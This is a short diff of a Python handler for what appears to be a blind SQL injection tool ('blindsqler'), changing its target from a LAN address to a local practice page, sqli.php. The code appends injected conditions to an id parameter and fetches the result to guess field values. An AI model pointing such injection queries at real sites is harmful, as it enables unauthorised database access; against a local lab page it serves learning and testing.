@@ -25,7 +25,7 @@ class Localhost(blindsqler.QueryHandler):
 		self.uid = uid # El ID del usuario
 		self.field = field # El campo cuyo valor se quiere adivinar
 	def query(self, data):
-		url = "http://192.168.2.102/public/sqli.php"
+		url = "http://localhost/public/sqli.php"
 		q = "%s AND %s %s" % (self.uid, self.field, data)
 		url = url + '?' + urlencode(dict(id=q))
 		pag = urlopen(url).read()
